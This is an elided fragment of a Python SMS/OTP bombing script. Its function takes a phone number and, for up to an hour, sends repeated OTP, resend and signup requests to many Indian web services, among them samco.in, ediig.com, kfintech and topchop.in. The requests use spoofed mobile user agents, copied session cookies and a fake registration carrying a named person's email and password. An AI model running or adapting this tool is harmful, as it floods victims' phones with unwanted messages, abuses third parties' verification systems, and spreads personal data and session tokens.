...
def smsg(number):
    ...
    # Loop until 3600 seconds have elapsed
    ...
    apis = [
        {
            ...
            "params": {"reason": "loginOrRegister", "mobile": number},
            "method": "GET"
        },
        {
        ...
        },
        {
            ...
            "params": {"identifier": "callmade", "mobile": number},
            "method": "GET"
        },
        {
        ...
        {
            "method": "POST",
            "url": 'https://www.samco.in/samco_account/mobile_resend_otp',
            "data": {
                'mobile_number': number,
                'clickToSend': 'WhatsApp'
            },
            "headers": {
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; V2250 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36',
                'sec-ch-ua-platform': '"Android"',
                ...
                'Cookie': 'ci_session=ehisp4mh173sga8p6faqijh1ojjpjidp; _gcl_au=1.1.233282799.1709129045; _fbp=fb.1.1709129045854.1476680214; _ga=GA1.1.1357551232.1709129046; moe_uuid=cf819720-533b-4d09-baab-2b7f5bf9a667; USER_DATA=%7B%22attributes%22%3A%5B%7B%22key%22%3A%22USER_ATTRIBUTE_UNIQUE_ID%22%2C%22value%22%3A%224475637%22%7D%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%22cf819720-533b-4d09-baab-2b7f5bf9a667%22%2C%22deviceAdded%22%3Atrue%7D; samco_details=dnI1Q2R1K2JFWnBSTWpSd2hybmc2QT09; _ga_DY5XK74QYC=GS1.1.1709129063.1.0.1709129065.58.0.0; SESSION=%7B%22sessionKey%22%3A%22952f95ce-c2f4-4f1c-93c3-4ab32fce94b1%22%2C%22sessionStartTime%22%3A%222024-02-28T14%3A04%3A09.040Z%22%2C%22sessionMaxTime%22%3A1800%2C%22sessionEnabled%22%3A%22allowed%22%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1709130867708%2C%22numberOfSessions%22%3A1%7D; _uetsid=3b294b70d64211eea73f496e9409f4c7; _uetvid=3b29fca0d64211ee82e823a58f233521; _ga_Z1GWTLJBB8=GS1.1.1709129046.1.1.1709129105.0.0.0'
            }
        },
        {
            "method": "POST",
        ...
        {
            "url": 'https://www.ediig.com/getOtp',
            "method": "POST",
            "data": {'mobileNo': number, 'device': 'WEB'},
            "headers": {}
        },
        {
        ...
        },
        {
            ...
            "headers": {
                ...
                'Content-Length': '22',
                'Accept': 'application/json, text/plain, */*',
                'X-Transaction-ID': 'JS-WEB-a713cd75-990d-46f0-90c6-f574b5faa009',
                'Device-ID': 'da7b8469-aabb-4644-8f9d-acb491379dfb',
                'Language': 'en',
                'Source': 'WEB',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Content-Type': 'application/json;charset=UTF-8',
        ...
        {
            "url": 'https://mfs.kfintech.com/investor/General/Register',
            "method": "POST",
            "headers": {
                ...
                'Referer': 'https://mfs.kfintech.com/investor/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
                'Cookie': 'ASP.NET_SessionId=ilmmicpa4mfofqsqi0yh4ukh; _gid=GA1.2.607527792.1702925841; _ga=GA1.1.194992630.1702925841; _gcl_au=1.1.1963513259.1702925840.1053678608.1702925899.1702925898; _ga_2Y1YQ3KN8G=GS1.1.1702925881.1.1.1702925935.6.0.0; _ga_7HZ6EWMCTM=GS1.1.1702925840.1.1.1702925936.0.0.0; _ga_DB00QT87SP=GS1.1.1702925881.1.1.1702925936.0.0.0; _ga_T7Q8NH789Q=GS1.1.1702925840.1.1.1702925944.0.0.0',
            },
            "data": {
                'registerUser.email': 'Shivamrajput66206@gmail.com',
                'registerUser.contryCode': '%2B91',
                'registerUser.mobile': number,
                'registerUser.pwd': 'gjQLj4q-bi53nz',
                'registerUser.cpwd': 'gjQLj4q-bi53nz',
                'registerUser.name': 'Shivam',
            }
        },
        {
        ...
        },
        {
            ...
            "headers": {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13; SM-A235F Build/TP1A.220624.014)',
                'Accept-Encoding': 'gzip'
            },
            "data": {
                'mobileNumber': number,
        ...
        {
            "url": 'https://www.topchop.in/livewire/message/signupcomponent',
            "headers": {
                'Host': 'www.topchop.in',
                'content-length': '541',
                # Add other headers as needed
